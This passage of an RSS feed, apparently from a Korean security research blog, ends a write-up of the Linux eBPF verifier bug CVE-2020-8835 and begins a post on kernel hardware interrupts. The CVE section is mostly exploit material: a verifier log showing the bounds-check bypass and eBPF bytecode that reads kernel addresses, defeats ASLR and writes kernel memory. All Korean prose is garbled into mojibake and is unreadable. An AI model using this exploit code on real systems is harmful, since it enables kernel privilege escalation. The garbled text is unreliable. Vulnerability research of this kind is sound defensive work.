&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_map_lookup_elem&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;37&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// R6=inv0 JITì»´íŒŒì¼ ê²°ê³¼ R6ëŠ” scalar 0 ìœ¼ë¡œ ì¸ì‹. oob ì²´í¬ ìš°íšŒ. ì‹¤ì œë¡œëŠ” 1&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;R0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inv0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;R6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inv0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;R7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inv0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;R9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;imm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;R10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mmmm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;????&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ê³„ì† ë‚˜ì˜¤ëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;call bpf_map_lookup_elem&lt;/code&gt;ì€ ë©”ëª¨ë¦¬ ê±´ë“œëŠ”ê²ƒ. ì½”ë”© ì»¨ë²¤ì…˜ ì–´ì…ˆê³¼ ë˜‘ê°™ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bpf_map_lookup_elem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bpf_map_update_elem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bpf_map_delete_elem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì´í›„ í• ë‹¹ëœ mapì£¼ë³€ì—ì„œ oobë¡œ ì ë‹¹íˆ ì»¤ë„ ì£¼ì†Œ ì½ê³  ì»¤ë„ ìµìŠ¤. writeë„ mapì— ì“°ë“¯ì´ ë˜‘ê°™ì´ íŠ¸ë¦¬ê±° í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;BPF_JMP_IMM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_JNE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// op=0 -&amp;gt; read aslr&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_ALU64_IMM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_MUL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x110&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_MAP_GET_ADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_ALU64_REG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_SUB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_LDX_MEM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_DW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_MAP_GET_ADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_STX_MEM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_DW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_EXIT_INSN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;BPF_JMP_IMM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_JNE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// op=1 -&amp;gt; write btf&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_ALU64_IMM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_MUL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xd0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_MAP_GET_ADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_ALU64_REG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_SUB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_MAP_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_STX_MEM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_DW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_EXIT_INSN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;BPF_JMP_IMM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_JNE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// op=2 -&amp;gt; read attr&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_ALU64_IMM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_MUL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_MAP_GET_ADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_ALU64_REG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_SUB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_LDX_MEM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_DW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_MAP_GET_ADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_STX_MEM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_DW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_EXIT_INSN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;reference&quot;&gt;reference&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.thezdi.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification&quot;&gt;https://www.thezdi.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://wariua.github.io/facility/extended-bpf.html&quot;&gt;https://wariua.github.io/facility/extended-bpf.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.kernel.org/doc/Documentation/networking/filter.txt&quot;&gt;https://www.kernel.org/doc/Documentation/networking/filter.txt&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.tcpdump.org/papers/bpf-usenix93.pdf&quot;&gt;http://www.tcpdump.org/papers/bpf-usenix93.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.netronome.com/m/documents/demystify-ebpf-jit-compiler.pdf&quot;&gt;https://www.netronome.com/m/documents/demystify-ebpf-jit-compiler.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/DayJun/Blogs/blob/master/Articles/CVES/CVE-2020-8835/&quot;&gt;https://github.com/DayJun/Blogs/blob/master/Articles/CVES/CVE-2020-8835/&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Fri, 01 May 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-05-01/CVE-2020-8835</link>
        <guid isPermaLink="true">http://localhost:4000/2020-05-01/CVE-2020-8835</guid>
        
        <category>pwn</category>
        
        <category>research</category>
        
        <category>cve</category>
        
        
      </item>
    
      <item>
        <title>hw interrupt</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ì¡°ì§„í˜¸&lt;/p&gt;

&lt;p&gt;ì¸í„°ëŸ½íŠ¸ëŠ” ì¤‘ë‹¨ì„ ì˜ë¯¸í•œë‹¤. ì¸í„°ëŸ½íŠ¸ê°€ ë°œìƒí•˜ë©´ í…Œì´ë¸”ì— ë“±ë¡ëœ í•¸ë“¤ëŸ¬ë¥¼ ì‹¤í–‰í•˜ê³ , ë‹¤ì‹œ ì›ë˜ ì½”ë“œë¡œ ëŒì•„ê°„ë‹¤. ë””ë°”ì´ìŠ¤ê°€ ì¸í„°ëŸ½íŠ¸ë¥¼ ë°œìƒì‹œí‚¤ë©´ ì‹¤í–‰í•˜ë˜ í”„ë¡œì„¸ìŠ¤ëŠ” í•˜ë˜ ì¼ì„ ë©ˆì¶”ê³  ì¸í„°ëŸ½íŠ¸ í•¸ë“¤ëŸ¬ë¥¼ ì‹¤í–‰í•œë‹¤. ì»¤ë„ì€ ì´ë¥¼ ì¸ì‹í•´ ë””ë°”ì´ìŠ¤ì˜ ìƒíƒœê°€ ë³€í•œê²ƒì„ ì¸ì‹í•˜ëŠ” ê²ƒì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ì•„ë˜ë¶€í„° ë¦¬ëˆ…ìŠ¤ ì»¤ë„ì—ì„œ ì¸í„°ëŸ½íŠ¸ë¥¼ ì²˜ë¦¬í•˜ëŠ” ê³¼ì •ì´ë‹¤. í•˜ë“œì›¨ì–´ ì¸í„°ëŸ½íŠ¸ ë°œìƒì‹œ, ì¸í„°ëŸ½íŠ¸ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê¸° ì „ í˜„ì¬ í•˜ë˜ ë ˆì§€ìŠ¤í„°ë“¤ì„ ìŠ¤íƒì— í‘¸ì‹œí•œë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;inline&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__must_check&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;request_irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irq_handler_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	    &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request_threaded_irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/include/linux/interrupt.h&lt;/code&gt; ì¸í„°ëŸ½íŠ¸ ì´ˆê¸°í™” í•©ìˆ˜ &lt;code class=&quot;highlighter-rouge&quot;&gt;request_irq&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;irq&lt;/code&gt;: ì¸í„°ëŸ½íŠ¸ ë²ˆí˜¸&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;handler&lt;/code&gt;: í˜¸ì¶œë  í•¸ë“¤ëŸ¬ ì£¼ì†Œ&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;flags&lt;/code&gt;: ì†ì„± í”Œë˜ê·¸&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt;: ì´ë¦„&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dev&lt;/code&gt;: í•¸ë“¤ëŸ¬ë¥¼ ì „ë‹¬í•˜ëŠ” íŒŒë¼ë¯¸í„°, ë³´í†µ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ êµ¬ì¡°ì²´&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request_irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c67x00_irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c67x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
